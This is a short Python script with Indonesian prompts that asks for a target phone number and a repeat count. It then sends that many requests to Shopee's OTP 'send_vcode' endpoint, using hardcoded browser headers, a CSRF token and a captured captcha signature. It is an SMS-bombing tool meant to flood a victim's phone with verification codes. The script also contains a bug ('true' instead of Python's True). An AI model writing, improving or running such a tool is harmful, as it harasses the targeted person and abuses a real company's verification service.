import requests,json

# daftar
nomor = int(input("Masukkan Target = "))
jumlah = int(input("Jumlah = "))
for i in range(jumlah):
    head = {
        'Host': 'shopee.co.id',
        'content-length': '1062',
        'sec-ch-ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'dnt': '1',
        'sec-ch-ua-mobile': '?1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
        'x-api-source': 'rweb',
        'content-type': 'application/json',
        'accept': 'application/json',
        'x-shopee-language': 'id',
        'x-requested-with': 'XMLHttpRequest',
        'x-csrftoken': 'idZo1OjYQNMAVoDGW8GqTpS6Kguq1Bd2',
        'af-ac-enc-sz-token': 'AapXF9m0VYex9EVQ3wGLGA==|QURtQTF77fBSAzTFE7iSKFOFkNlrE1pj5WYlxY22H5xEmGQAZME662mZt4Q5ATx5QOZt9zk+b/3E2vZPN+KT3/DcelGtXjo+HhI=|qC8lfaMh+RHHns/b|06|3',
        'sec-ch-ua-platform': '"Android"',
        'origin': 'https://shopee.co.id',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://shopee.co.id/buyer/signup?from=%2F&next=%2F',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
    }
    data = json.dumps({"phone":nomor,"force_channel":true,"captcha_signature":"45d425f603384aba5516cca4c4807bfea2e2ce2d12927d0bf21923a92e6d86da8f3b765c93c10460d2905b65823f36e55d9b8938e7b7e66f7127fe5e022b8308a6753138702aadf951fffbd91405ccc88829e75c020c344bc35cbef23bb33f6687a3ba235e62b06c63bdcd3698f44f47c0d4baffd50bf1980cee826feaf07b4edadabab40e60fd535953c6409587c0a0ac18954704cfdfa16bc15393fdbe1eefdd369490190a5966263c8f0b6f12d67479b6ee98515af8871e81aee9bc2ff1dbc1bcc6a416b26e5bd7ee37eba85e770a359b618e9dbeeed0764c430835ad0ed6407179adb7d731fdcb6d53af5ccae28b13ba3292792f37546ed9ac9327043eb3dd3d3ef877d980c5ecc1d1161ce989f3104f207c981772772094fd49022cd16f3fff1db6795c85be1ae038d24b8aef97f28abc73b95092b8ca048eb2e0f5643896bb7965e28e433f3e77dd512fc9d8921838224e035c129381888b2ad5cee52ea5f733521e92a08381570caeb76178f123c09f8a7531050e6ea7b0149534420ff096468e071279cf1089692a86548931601c9e487de635188b03ef31f295505505dce1ab4c471115c0d68b4846d5a2fd95247f5ef55ea13a229012022c01f5f7381c01faec235b0829","operation":8,"channel":1,"supported_channels":[1,2,3],"support_session":false})
    up = requests.post("https://shopee.co.id/api/v4/otp/send_vcode",data=data,headers=head).text
